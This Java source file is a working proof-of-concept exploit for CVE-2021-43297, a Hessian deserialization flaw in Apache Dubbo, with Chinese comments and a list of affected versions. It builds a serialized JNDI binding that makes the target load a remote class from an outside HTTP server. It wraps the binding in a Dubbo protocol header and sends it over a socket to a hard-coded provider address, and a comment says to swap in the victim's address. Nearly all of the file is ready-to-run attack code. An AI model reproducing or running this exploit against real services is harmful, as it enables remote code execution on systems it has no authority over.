package cve;

import com.caucho.hessian.io.Hessian2Output;

import org.apache.dubbo.common.io.Bytes;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import sun.reflect.ReflectionFactory;

import javax.naming.Context;
import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.Socket;
import java.util.Random;


/**
 * 影响版本：
 * Apache Dubbo 2.6.x <= 2.6.12
 * Apache Dubbo 2.7.x <= 2.7.14
 * Apache Dubbo 3.0.x <= 3.0.5
 */
public class CVE_2021_43297 {

    public static void main(String[] args) throws Exception {

        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("util.ExecTest", "util.ExecTest","http://10.72.160.176:8080/");
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

//        Field fullName = binding.getClass().getSuperclass().getSuperclass().getDeclaredField("fullName");
//        fullName.setAccessible(true);
        Reflections.setFieldValue(binding, "fullName", "<<<<<");
//        fullName.set(binding, "<<<<<");  // 方便定位属性值的



        //############################################################################################
        // 写入binding
        ByteArrayOutputStream binding2bytes = new ByteArrayOutputStream();
        Hessian2Output outBinding = new Hessian2Output(binding2bytes);
        outBinding.writeObject(binding);
        outBinding.flushBuffer();
        //############################################################################################
        // binding序列化后的byte数组
        byte[] bindingBytes = binding2bytes.toByteArray();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        // 在header中记录 序列化对象 的长度，因为最后一个F被覆盖了，所以要-1
        Bytes.int2bytes(bindingBytes.length*2-1, header, 12);

        // 收集header+binding
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(bindingBytes);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        //############################################################################################
        // 组装payload = header+binding+binding
        byte[] payload = new byte[bytes.length + bindingBytes.length -1];
        for (int i = 0; i < bytes.length; i++) {
            payload[i] = bytes[i];
        }

        for (int i = 0; i < bindingBytes.length; i++) {
            payload[i + bytes.length-1] = bindingBytes[i];
        }
        //############################################################################################


        // 输出字节流的十六进制
        for (int i = 0; i < payload.length; i++) {
            System.out.print(String.format("%02X", payload[i]) + " ");
            if ((i + 1) % 8 == 0)
                System.out.print(" ");
            if ((i + 1) % 16 == 0 )
                System.out.println();
        }
        System.out.println();
        // 输出byte数组转String
        System.out.println(new String(payload,0,payload.length));

        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("10.41.230.66", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(payload);
        outputStream.flush();
        outputStream.close();
        System.out.println("\nsend!!");
    }


    public static class Reflections{
        public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception{
            Field field=null;
            Class cl = obj.getClass();
            while (cl != Object.class){
                try{
                    field = cl.getDeclaredField(fieldName);
                    if(field!=null){
                        break;}
                }
                catch (Exception e){
                    cl = cl.getSuperclass();
                }
            }
            if (field==null){
                System.out.println(obj.getClass().getName());
                System.out.println(fieldName);
            }
            field.setAccessible(true);
            field.set(obj,fieldValue);
        }

        public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
            return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
        }

        public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
            Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
            objCons.setAccessible(true);
            Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
            sc.setAccessible(true);
            return (T) sc.newInstance(consArgs);
        }
    }
}